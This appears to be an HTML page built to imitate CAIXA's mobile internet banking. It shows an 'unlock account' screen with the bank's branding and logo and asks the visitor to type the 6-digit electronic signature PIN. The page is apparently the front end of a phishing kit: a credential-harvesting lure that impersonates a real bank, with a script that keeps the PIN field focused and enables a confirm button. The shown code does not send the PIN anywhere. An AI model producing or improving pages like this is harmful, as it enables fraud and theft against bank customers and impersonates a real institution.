<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CAIXA | Segurança</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f7f7f7;
            color: #333;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .phone-screen {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }

        .bg-caixa-blue { background-color: #005ca9; }
        .text-caixa-blue { color: #005ca9; }
        .header-gradient {
            background: linear-gradient(180deg, #005ca9 0%, #004a87 100%);
        }

        /* Estilo dos campos de dígito visíveis */
        .pin-dot {
            width: 40px;
            height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            border: 2px solid #ced4da;
            background-color: transparent;
            font-size: 1.25rem;
            font-weight: bold;
            color: #005ca9;
            transition: all 0.2s ease;
        }

        .pin-dot.active {
            border-color: #f39200;
            background-color: #fff9f0;
        }

        #real-input {
            position: absolute;
            opacity: 0;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
        }

        .btn-confirmar {
            background-color: #f39200;
            color: white;
            font-weight: 700;
            text-transform: uppercase;
            transition: all 0.3s ease;
        }

        .btn-confirmar:disabled {
            background-color: #e0e0e0;
            color: #a0a0a0;
        }

        .caixa-logo {
            filter: brightness(0) invert(1);
            height: 24px;
        }
    </style>
</head>
<body>

    <div class="phone-screen" onclick="document.getElementById('real-input').focus()">
        <div class="header-gradient text-white p-5 flex items-center shadow-md">
            <button class="mr-4"><i data-lucide="chevron-left" class="w-7 h-7"></i></button>
            <div class="flex-grow">
                <p class="text-[10px] uppercase opacity-70 font-bold tracking-widest">Internet Banking</p>
                <p class="text-lg font-medium">Validação de Acesso</p>
            </div>
            <img src="https://logodownload.org/wp-content/uploads/2014/02/caixa-logo-1.png" alt="CAIXA" class="caixa-logo">
        </div>

        <div class="p-6 flex-grow">
            <div class="mb-8">
                <h2 class="text-2xl font-bold text-caixa-blue mb-2">Desbloquear Conta</h2>
                <p class="text-zinc-500 text-sm leading-relaxed">
                    Informe sua <strong>Assinatura Eletrônica</strong> para continuar.
                </p>
            </div>

            <div class="flex flex-col items-center mt-10">
                <p class="text-xs font-bold text-zinc-400 mb-6 uppercase tracking-widest">Digite os 6 dígitos</p>
                
                <div class="flex justify-center gap-3 mb-10">
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                </div>

                <input 
                    type="tel" 
                    id="real-input" 
                    inputmode="numeric" 
                    pattern="[0-9]*" 
                    maxlength="6" 
                    autocomplete="off"
                    autofocus
                >
            </div>
        </div>

        <div class="p-6 mt-auto">
            <button id="btn-continue" disabled class="btn-confirmar w-full py-4 rounded-md shadow-lg mb-4">
                Confirmar Desbloqueio
            </button>
        </div>
    </div>

    <script>
        lucide.createIcons();

        const realInput = document.getElementById('real-input');
        const dots = document.querySelectorAll('.pin-dot');
        const btnContinue = document.getElementById('btn-continue');

        realInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value;
            
            dots.forEach((dot, index) => {
                if (index < value.length) {
                    dot.innerText = value[index]; // Escreve o número no quadrado
                    dot.classList.add('active');
                } else {
                    dot.innerText = ''; // Limpa se apagar
                    dot.classList.remove('active');
                }
            });

            btnContinue.disabled = (value.length !== 6);
        });

        // Garante que o teclado suba ao clicar na tela
        window.onload = () => setTimeout(() => realInput.focus(), 500);
        realInput.addEventListener('blur', () => setTimeout(() => realInput.focus(), 150));
    </script>
</body>
</html>
